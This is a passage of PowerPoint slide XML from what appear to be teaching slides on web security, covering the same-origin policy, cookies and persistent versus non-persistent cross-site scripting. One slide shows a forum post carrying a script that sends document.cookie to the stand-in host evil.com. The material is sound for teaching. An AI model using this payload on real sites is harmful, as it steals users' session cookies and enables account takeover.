        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8229600" cy="1531363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="-342900">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>If the same server hosts unrelated sites, scripts from one site can access document properties on the other</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1380924" y="3008273"/>
            <a:ext cx="2959124" cy="305758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1985078" y="3119772"/>
            <a:ext cx="1736473" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>doctype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> html&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1864671" y="4313519"/>
            <a:ext cx="1894327" cy="116731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&lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XXXX</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4811070" y="3255122"/>
            <a:ext cx="3875730" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>www.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>test.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="3908509" y="3255122"/>
            <a:ext cx="939552" cy="2177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589233" y="3858973"/>
            <a:ext cx="0" cy="604121"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="008000"/>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680479" y="3843853"/>
            <a:ext cx="1947844" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>Access Allowed!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="008000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42026151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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="6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latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>Language </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3600" b="1" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>executed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t> by browser</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="6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sz="2400" dirty="0">
              <a:latin typeface="Arial" charset="0"/>
              <a:cs typeface="Arial" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="6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400" dirty="0"/>
              <a:t>JavaScript programs in a webpage will follow the same-origin policy. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34606748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Threat</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Webpage with sensitive information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2174875"/>
            <a:ext cx="4040188" cy="1388203"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Personal information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Credential</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Evil webpage controlled by attackers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4645025" y="2174875"/>
            <a:ext cx="4041775" cy="1388203"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript used for malicious purpose (e.g., information stolen)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="chromebeatsfiref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792" y="4429773"/>
            <a:ext cx="2293321" cy="1627518"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9" descr="chromebeatsfiref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328" y="4392786"/>
            <a:ext cx="2293321" cy="1627518"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="images-2.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5774" y="4832963"/>
            <a:ext cx="1183773" cy="886687"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Picture 11" descr="images-1.jpe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6168" y="4808305"/>
            <a:ext cx="1120468" cy="1038717"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Freeform 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2527585" y="3523079"/>
            <a:ext cx="3908509" cy="1272898"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 3908509 w 3908509"/>
              <a:gd name="connsiteY0" fmla="*/ 989331 h 1272898"/>
              <a:gd name="connsiteX1" fmla="*/ 2059056 w 3908509"/>
              <a:gd name="connsiteY1" fmla="*/ 3012 h 1272898"/>
              <a:gd name="connsiteX2" fmla="*/ 0 w 3908509"/>
              <a:gd name="connsiteY2" fmla="*/ 1272898 h 1272898"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3908509" h="1272898">
                <a:moveTo>
                  <a:pt x="3908509" y="989331"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="3309491" y="472541"/>
                  <a:pt x="2710474" y="-44249"/>
                  <a:pt x="2059056" y="3012"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1407638" y="50273"/>
                  <a:pt x="0" y="1272898"/>
                  <a:pt x="0" y="1272898"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:ln>
            <a:tailEnd type="arrow" w="lg" len="lg"/>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Attempt to Access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32044842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Cookie</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="http_session_cookie_illustrati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4373" y="1417638"/>
            <a:ext cx="6176856" cy="4937730"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1856079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 Cookie Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Javascript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8229600" cy="639147"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> x = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="oct-24-004-e1291035570215.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2511" y="2465368"/>
            <a:ext cx="5216364" cy="3709904"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4017641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Two Types of Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Persistent XXS Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Saved persistently in the database</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Damage massive users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Non-Persistent XXS Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Targeted victims</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18772968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Post A Message in the Forum</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="forum.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951" y="3180877"/>
            <a:ext cx="4710689" cy="3501612"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="9" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="209603" y="1417639"/>
            <a:ext cx="7545766" cy="1482683"/>
            <a:chOff x="579495" y="1726058"/>
            <a:chExt cx="7545766" cy="1967124"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Rectangle 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="579495" y="1726058"/>
              <a:ext cx="7545766" cy="1652085"/>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rPr>
                <a:t>Hello World!</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Rounded Rectangle 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7360821" y="3384958"/>
              <a:ext cx="764440" cy="30822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POST</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9" descr="images-2.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8274" y="2220022"/>
            <a:ext cx="1134395" cy="849701"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="Serv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2866" y="4191856"/>
            <a:ext cx="965423" cy="1112691"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7052866" y="3069723"/>
            <a:ext cx="332611" cy="11221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182354" y="4068566"/>
            <a:ext cx="3329014" cy="36987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Hello World! </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Straight Arrow Connector 14"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="14" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="5511368" y="4253501"/>
            <a:ext cx="2077695" cy="48997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49566" y="5248867"/>
            <a:ext cx="3009900" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A web Forum (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>www.sss.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) that keeps users’ sensitive information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2816120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Persistent Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="forum.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951" y="3180877"/>
            <a:ext cx="4710689" cy="3501612"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="9" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="209603" y="1417638"/>
            <a:ext cx="7545766" cy="1652085"/>
            <a:chOff x="579495" y="1726058"/>
            <a:chExt cx="7545766" cy="1652085"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Rectangle 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="579495" y="1726058"/>
              <a:ext cx="7545766" cy="1652085"/>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rPr>
                <a:t>Hello World!</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>&lt;script&gt;</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>new Image().</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>src</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>="http://</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>evil.com</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>/</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>log.cgi?c</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>="+</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>encodeURI</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>document.cookie</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>);</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>&lt;/script&gt;</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Rounded Rectangle 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6990929" y="2971286"/>
              <a:ext cx="764440" cy="30822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POST</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9" descr="images-2.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5369" y="2220022"/>
            <a:ext cx="1134395" cy="849701"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="Serv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2866" y="4191856"/>
            <a:ext cx="965423" cy="1112691"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7052866" y="3069723"/>
            <a:ext cx="332611" cy="11221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182354" y="4068566"/>
            <a:ext cx="3329014" cy="36987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Hello World! &lt;script&gt;…&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Straight Arrow Connector 14"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="14" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="5511368" y="4253501"/>
            <a:ext cx="2077695" cy="48997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49566" y="5248867"/>
            <a:ext cx="3009900" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A web Forum (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>www.sss.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) that keeps users’ sensitive information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9992030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Persistent Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="chromebeatsfiref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421" y="1532197"/>
            <a:ext cx="2293321" cy="1627518"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="images-1.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507" y="3030069"/>
            <a:ext cx="674132" cy="624946"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="Serv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8566" y="1532197"/>
            <a:ext cx="965423" cy="1112691"/>
          </a:xfrm>
